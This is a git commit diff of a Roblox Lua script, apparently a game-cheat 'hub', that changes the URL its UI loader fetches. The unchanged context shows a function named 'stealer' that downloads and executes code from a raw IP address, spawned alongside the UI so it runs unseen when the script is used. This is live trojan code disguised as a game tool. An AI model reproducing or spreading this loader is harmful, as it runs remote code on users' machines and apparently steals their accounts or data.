10c8e7f7be07c754dce5bc6468976c82d6758dd0
XNatHub <akiakiakiyep@gmail.com>
2025-11-15 23:08:01 +0800

    Update and rename SpeedHub.lua to NatHubLuarmor.lua

--- NatHubLuarmor.lua
+++ NatHubLuarmor.lua
@@ -3,7 +3,7 @@ local function stealer()
     loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/dy1zn4t/NatHub/refs/heads/main/loader"))();
 end
 task.spawn(stealer)
 task.spawn(loadui)
